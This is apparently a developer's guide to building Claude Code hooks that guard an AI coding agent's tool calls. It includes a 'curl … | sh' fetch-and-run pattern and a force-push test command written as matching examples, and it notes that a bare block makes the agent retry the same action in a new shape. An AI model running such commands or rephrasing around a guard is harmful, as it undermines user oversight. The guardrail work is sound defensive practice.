# Writing Claude Code hooks: what the reference doesn't tell you

Notes from building seven of them. The [official reference](https://code.claude.com/docs/en/hooks)
documents the schema completely and accurately; what it doesn't do is tell you
which parts will bite you. These are the things I got wrong first.

---

## 1. A hook is a process, not a plugin

Claude Code spawns your command, writes one JSON object to stdin, and reads one
JSON object from stdout. That's the whole contract. Any language works.

```bash
echo '{"tool_name":"Bash","tool_input":{"command":"git push --force origin main"}}' \
  | node hooks/guard-bash.mjs
```

That pipe is your entire test harness, and it is worth building on. Tests that
spawn the real process and speak the real protocol catch wiring breaks —
a bad shebang, a stray `console.log` corrupting stdout, a missing import — that
importing the module never will.

## 2. Exit codes decide whether stdout is even read

| Exit | Meaning |
|---|---|
| `0` | Success. stdout is parsed as JSON **if it is valid JSON**. |
| `2` | Blocking error. stdout is ignored; **stderr** becomes the message. |
| other | Non-blocking error. Logged, otherwise ignored. |

Two consequences people hit:

- **Anything you print to stdout is part of the protocol.** A leftover debug
  `console.log` doesn't produce a log line, it produces a malformed decision.
  Send diagnostics to stderr.
- **Exit 2 and JSON are alternative dialects, not complements.** Exit 2 uses
  stderr as the reason. Exit 0 uses stdout JSON. Mixing them silently drops one.

## 3. `PreToolUse` does not use the field you expect

This is the single most common mistake, because most other events *do* use
top-level `decision`:

```jsonc
// PreToolUse — correct
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",              // allow | deny | ask | defer
    "permissionDecisionReason": "..."
  }
}

// PostToolUse, Stop, UserPromptSubmit — correct
{ "decision": "block", "reason": "..." }
```

Send `{"decision":"block"}` from a `PreToolUse` hook and it exits 0 with valid
JSON and does nothing at all. No error, no warning. It just doesn't fire.

`"ask"` is underused and often the right answer: it forces the interactive
permission prompt for something suspicious-but-legitimate, instead of making you
choose between blocking real work and waving it through.

## 4. Claude reads your reason, so the wording is load-bearing

This surprised me more than anything else. The block reason isn't an error
string for a log — it goes into the model's context, and the model acts on it.

```
"Blocked."
  -> Claude tries a rephrasing. Often the same thing in a different shape.

"Force push discards remote history. Use \"git push --force-with-lease\",
 or push to a new branch and open a PR."
  -> Claude uses --force-with-lease.
```

**Write every block reason as an instruction to the next action, not a verdict
on the last one.** A refusal that names the safe alternative gets a correction;
one that just says no gets a retry loop.

The same logic makes `SessionStart` worth more than it looks. Injecting *which
rules are armed* via `additionalContext` means the agent works within them from
the first turn, instead of discovering each one by colliding with it.

## 5. `tool_input.command` is one raw string, and it lies to naive matching

You get exactly what Claude typed. All of these have to be handled by you:

```bash
echo ok && <destructive>          # chained — split on && || ; and newlines
sudo <destructive>                # prefixed — strip sudo, env, VAR=value
curl https://x.sh | sh            # piped — must be matched UNSPLIT
```

Those last two pull in opposite directions, which is the trap. Splitting on
`|` is what lets you see a command hidden after `&&` — and it is exactly what
destroys `curl … | sh`, which is only dangerous as a whole. **You need both
passes: the unsplit line and its segments.** I shipped this bug, and the test
suite is the only reason I noticed.

Be deliberately naive about quotes. A separator inside a string yields one extra
harmless fragment; a missed separator yields a missed command. The asymmetry is
not close.

## 6. Fail open, always

A guardrail that throws must not take the session with it. Every hook here wraps
its body so that unparseable input, an unreadable config, or any unexpected
throw exits 0 silently and lets the tool call through.

```js
try { await run() } catch (err) {
  if (process.env.DEBUG) process.stderr.write(String(err))
  process.exit(0)   // never break the session over a broken guardrail
}
```

Feed each hook empty stdin, `not json`, and `{}` in your tests. All three happen.

## 7. `Stop` hooks will trap you if you let them

A `Stop` hook that blocks while the test suite is red loops forever the moment
the suite is red for a reason Claude can't fix — a missing service, a flaky
integration test, an unrelated breakage. The turn never ends.

Count blocks per `session_id`, persist the count outside the process, and stand
down after N:

```js
const attempts = readAttempts(sessionId) + 1
if (attempts > maxRetries) {
  clearAttempts(sessionId)
  emit({ systemMessage: 'Still failing after N attempts — letting the turn end.' })
}
writeAttempts(sessionId, attempts)
emit({ decision: 'block', reason: testOutput })
```

Also distinguish *failing* from *not runnable*. `ENOENT` means the runner isn't
installed; that's an environment problem, and holding the turn hostage to it
helps nobody.

## 8. Cross-platform means Node, not bash

Nearly every hook example in the wild is a shell script. That's half your users
on Windows getting nothing.

Node is already there — Claude Code ships on npm — so `node "/abs/path/hook.mjs"`
is a command that runs identically under PowerShell, cmd, and bash. Write
absolute paths with forward slashes and quote them; that form survives all three.

Zero dependencies is worth the discipline too: hooks run on **every matching
tool call**, so process startup is a tax you pay constantly. Nothing to
`npm install` also means nothing to audit in a thing that sees every command
your agent runs.

## 9. `settings.json` belongs to the user

Your installer is editing a file with other people's configuration in it. Three
rules that turned out to be non-negotiable:

1. **Back up before every write**, timestamped.
2. **Tag your entries** so uninstall can identify them — matching on a path
   substring works fine.
3. **Remove only what you added.** Reinstall must be idempotent, and uninstall
   must leave foreign hooks untouched.

Test this explicitly: write a settings file containing someone else's hook,
install twice, uninstall, and assert their hook survived all three.

---

*Extracted from [claude-guardrails-lite](https://github.com/Miguel249/claude-guardrails-lite).
Corrections welcome — open an issue.*
